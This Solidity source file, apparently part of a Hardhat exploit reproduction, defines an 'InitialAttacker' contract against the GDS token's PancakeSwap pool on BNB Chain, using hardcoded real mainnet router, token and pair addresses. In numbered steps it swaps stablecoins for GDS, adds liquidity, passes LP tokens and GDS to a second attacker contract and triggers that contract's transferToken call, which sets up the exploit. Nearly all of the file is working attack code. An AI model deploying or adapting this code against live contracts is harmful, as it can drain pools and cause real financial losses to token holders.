// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
import "../interfaces/IPancakeRouter02.sol";
import "../interfaces/IPancakePair.sol";
import "./Attacker1.sol";
import "hardhat/console.sol";

contract InitialAttacker {
    using SafeMath for uint256;

    address public PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public GDS_ADDRESS = 0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278;
    address public USDCContractAddress =
        0x55d398326f99059fF775485246999027B3197955;
    address public PANCAKE_PAIR_GDS_USDC =
        0x4526C263571eb57110D161b41df8FD073Df3C44A;

    // 1. have initial 120+some usdc balance and swap for gds
    function start(address attacker_contract_address) external {
        IERC20(USDCContractAddress).approve(PANCAKE_ROUTER, 12e20);
        address[] memory path = new address[](2);
        path[0] = USDCContractAddress; // USDC
        path[1] = GDS_ADDRESS; // GDS
        IPancakeRouter02(PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                5e18,
                0,
                path,
                address(this),
                block.timestamp + 100
            );

        console.log(
            "GDS balance of this ATTACKER contract after swap: ",
            IERC20(GDS_ADDRESS).balanceOf(address(this))
        );

        // 2. add liquidity to gds/usdc pair and receive gds/usdc lp tokens
        // 2.1 approve pancakeswap router to spend our GDS
        IERC20(GDS_ADDRESS).approve(
            PANCAKE_ROUTER,
            IERC20(GDS_ADDRESS).balanceOf(address(this))
        );

        // 2.2 add liquidity of small amount of gds and usdc
        IPancakeRouter02(PANCAKE_ROUTER).addLiquidity(
            USDCContractAddress,
            GDS_ADDRESS,
            5e18,
            2e19,
            0,
            0,
            address(this),
            block.timestamp + 100
        );
        console.log(
            "gds balance of this contract after add liq",
            IERC20(GDS_ADDRESS).balanceOf(address(this))
        );

        console.log(
            "LP balance Of This Contract After Liquidity",
            IPancakePair(PANCAKE_PAIR_GDS_USDC).balanceOf(address(this))
        );

        // 3. transfer small amount lp tokens to the attacker1 contract
        IPancakePair(PANCAKE_PAIR_GDS_USDC).transfer(
            attacker_contract_address,
            2e18
        );

        console.log(
            "LP balance Of attacker1 After Transfer",
            IPancakePair(PANCAKE_PAIR_GDS_USDC).balanceOf(address(this))
        );

        // 4. transfer 120usdc equivalent to gds to the attacker1 contract
        IPancakeRouter02(PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                12e19,
                0,
                path,
                attacker_contract_address,
                block.timestamp + 100
            );

        console.log(
            "GDS balance of ATTACKER 1 contract after swap",
            IERC20(GDS_ADDRESS).balanceOf(attacker_contract_address)
        );

        // 5. CALL TransferToken function of the attacker1 contract
        Attacker1(attacker_contract_address).transferToken();
    }
}
